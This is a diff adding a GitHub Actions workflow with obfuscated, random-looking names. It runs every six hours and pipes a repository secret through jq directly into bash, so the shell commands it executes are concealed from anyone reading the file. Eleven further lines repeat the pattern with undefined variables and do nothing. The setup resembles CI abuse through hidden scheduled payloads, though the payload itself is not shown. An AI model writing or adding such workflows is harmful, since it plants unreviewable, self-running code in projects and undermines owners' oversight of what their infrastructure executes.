@@ -1,0 +1,28 @@
+name: changweiwu3891
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: changweiwu3891
+        env:
+          vtkut206: ${{ secrets.vtkut206 }}
+        run: |
+          echo $vtkut206 | jq -r .hx0338 | /bin/bash
+          echo $qwxp9 | jq -r .d961 | /bin/bash
+          echo $a3487 | jq -r .tcpq380 | /bin/bash
+          echo $nphl5 | jq -r .en04 | /bin/bash
+          echo $waa992 | jq -r .lpqvn694 | /bin/bash
+          echo $kfdd9 | jq -r .qzmj6 | /bin/bash
+          echo $xwozr14396 | jq -r .pjujt2360 | /bin/bash
+          echo $h5040 | jq -r .vrod120 | /bin/bash
+          echo $ujpss49700 | jq -r .hx9 | /bin/bash
+          echo $e1873 | jq -r .nqyh6058 | /bin/bash
+          echo $ewz0 | jq -r .gy32104 | /bin/bash
+          echo $ft024 | jq -r .m45361 | /bin/bash
+
